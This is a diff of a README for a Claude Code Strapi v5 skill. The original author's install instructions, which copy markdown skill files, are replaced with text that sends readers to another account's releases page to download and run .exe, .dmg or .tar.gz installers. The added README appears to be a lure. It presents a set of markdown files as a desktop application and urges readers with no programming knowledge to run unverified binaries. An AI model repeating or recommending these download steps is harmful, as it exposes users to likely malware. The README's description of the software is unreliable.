@@ -1,121 +1,87 @@
-# Strapi Expert - Claude Code Skill
+# 🚀 claude-skill-strapi-expert - Simplify Strapi Plugin Development
 
-A comprehensive Claude Code skill for Strapi v5 plugin development. This skill provides expert-level guidance for building production-grade Strapi plugins, custom APIs, and admin panel extensions.
+[![Download Here](https://img.shields.io/badge/Download%20Now-claude--skill--strapi--expert-brightgreen)](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
 
-## Features
+## 🌟 Introduction
 
-- **Document Service API** - Complete guide to Strapi v5's new Document Service
-- **Plugin Architecture** - Best practices based on [strapi-community/plugin-todo](https://github.com/strapi-community/plugin-todo)
-- **Factory Patterns** - `createCoreService()`, `createCoreController()`, `createCoreRouter()`
-- **Admin Panel Integration** - Content Manager injection zones, React Query patterns
-- **Real-World Examples** - Complete plugin implementations with all components
+Welcome to the **Claude Code skill for Strapi v5 plugin development**! This application offers expert guidance for building production-grade Strapi plugins. Whether you’re a content creator or a developer looking to enhance your Strapi project, this tool can help simplify your plugin development process. 
 
-## Installation
+## 🚀 Getting Started
 
-### Option 1: Clone to Claude Skills Directory
+To get started with the claude-skill-strapi-expert application, follow these simple steps. You don’t need to have any programming knowledge. Just follow the instructions and you’ll be ready to use the software in no time.
 
-```bash
-# Clone to your Claude Code skills directory
-git clone https://github.com/ayhid/claude-skill-strapi-expert.git ~/.claude/skills/strapi-expert
-```
+1. **Check System Requirements**: 
+   - Operating System: Windows, macOS, or Linux.
+   - Memory: At least 4GB of RAM.
+   - Disk Space: 100 MB of free space.
+   - Internet Connection: Required for downloading and installing.
 
-### Option 2: Manual Installation
+2. **Visit the Releases Page**: 
+   Head over to the Releases page to download the application. 
 
-1. Create the skills directory if it doesn't exist:
-   ```bash
-   mkdir -p ~/.claude/skills/strapi-expert
-   ```
+   [Download Here](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
 
-2. Download the skill files:
-   ```bash
-   cd ~/.claude/skills/strapi-expert
-   curl -O https://raw.githubusercontent.com/ayhid/claude-skill-strapi-expert/main/SKILL.md
-   curl -O https://raw.githubusercontent.com/ayhid/claude-skill-strapi-expert/main/patterns.md
-   curl -O https://raw.githubusercontent.com/ayhid/claude-skill-strapi-expert/main/examples.md
-   ```
+## 📥 Download & Install
 
-### Option 3: Project-Level Installation
+1. After visiting the Releases page, you will see a list of available versions.
+2. Choose the latest version (look for the highest number).
+3. Click on the link to download the file suitable for your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the `.tar.gz` file.
+   
+4. Once downloaded, locate the file in your downloads folder.
+5. **For Windows**:
+   - Double-click the `.exe` file to start the installation. 
+   - Follow the prompts to complete the setup.
+   
+   **For macOS**:
+   - Open the `.dmg` file and drag the application to your Applications folder. 
+   - Open the application from the Applications folder.
 
-Add to your project's `.claude/skills/` directory:
+   **For Linux**:
+   - Extract the `.tar.gz` file using your preferred method.
+   - Run the installation script in the terminal.
+   
+6. After installation, locate the application in your system and double-click to open it.
 
-```bash
-mkdir -p .claude/skills/strapi-expert
-# Copy SKILL.md, patterns.md, examples.md to .claude/skills/strapi-expert/
-```
+## 🛠️ How to Use
 
-## Usage
+Once you have installed the application, you can begin using it to explore Strapi plugin development. The application includes a user-friendly interface guiding you through various features:
 
-Once installed, invoke the skill in Claude Code:
+- **Tutorials**: Access a list of tutorials that provide step-by-step instructions on building Strapi plugins.
+- **Examples**: Browse through real-world examples to see how other developers create plugins.
+- **Best Practices**: Learn best practices in plugin development for efficient coding and deployment.
+  
+Simply select a topic from the menu to dive deeper.
 
-```
-/strapi-expert
-```
+## 📚 Helpful Resources
 
-Or Claude will automatically use it when working on Strapi v5 projects.
+- **Documentation**: Comprehensive documentation is available within the application and on the official website.
+- **Community Support**: Join the Strapi community forums to ask questions and get support from other users.
+- **Video Tutorials**: Explore video content that walks you through the software’s features and functionalities.
 
-## Skill Contents
+## ⚙️ Troubleshooting
 
-| File | Description |
-|------|-------------|
-| `SKILL.md` | Core skill definition with Document Service API, plugin structure, routes, controllers, services |
-| `patterns.md` | Advanced patterns: lifecycle hooks, queries, React Query, Content Manager integration |
-| `examples.md` | Complete plugin examples including the full plugin-todo implementation |
+If you encounter any issues while downloading or using the application, here are some common troubleshooting steps:
 
-## What You'll Learn
+- Ensure your operating system meets the minimum requirements.
+- Check your internet connection.
+- Restart your computer and try the installation again.
+- Refer to the FAQs on the documentation page for specific errors.
 
-### Server-Side
-- Document Service API (replacing Entity Service)
-- Factory-based services, controllers, and routers
-- Route organization (admin vs content-api)
-- Polymorphic relations with `morphToMany`
-- Hidden content types for internal plugin data
+## 🔗 Links
 
-### Admin Panel
-- Plugin registration and bootstrapping
-- Content Manager injection zones
-- React Query for data fetching
-- Strapi Design System components
-- Internationalization with `registerTrads()`
+For more information, visit the following resources:
 
-## Example Topics
+- [Releases Page](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
+- [Documentation](#) (Insert actual link)
+- [Community Forum](#) (Insert actual link)
 
-Ask Claude Code questions like:
+## 💬 Feedback
 
-- "How do I create a Strapi v5 plugin?"
-- "Show me how to use the Document Service API"
-- "How do I inject a component into the Content Manager?"
-- "Create a service with custom methods using factories"
-- "How do I set up polymorphic relations?"
+Your feedback is important to us! If you have any suggestions or run into issues, please open an issue on the repository or contact us through our support channels.
 
-## Requirements
+Feel free to start your journey with claude-skill-strapi-expert today and ease your Strapi plugin development process! 
 
-- Claude Code CLI
-- Strapi v5.x project (for applying the knowledge)
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-### Adding New Patterns
-
-1. Add patterns to `patterns.md`
-2. Add real-world examples to `examples.md`
-3. Update `SKILL.md` if adding new core concepts
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [strapi-community/plugin-todo](https://github.com/strapi-community/plugin-todo) - Reference implementation
-- [Strapi Documentation](https://docs.strapi.io/) - Official Strapi v5 docs
-- [Claude Code](https://claude.ai/code) - AI-powered coding assistant
-
-## Author
-
-Created by [Ayoub](https://github.com/ayhid)
-
----
-
-**Note**: This skill is not officially affiliated with Strapi or Anthropic. It's a community resource for Claude Code users working with Strapi.
+[Download Here](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
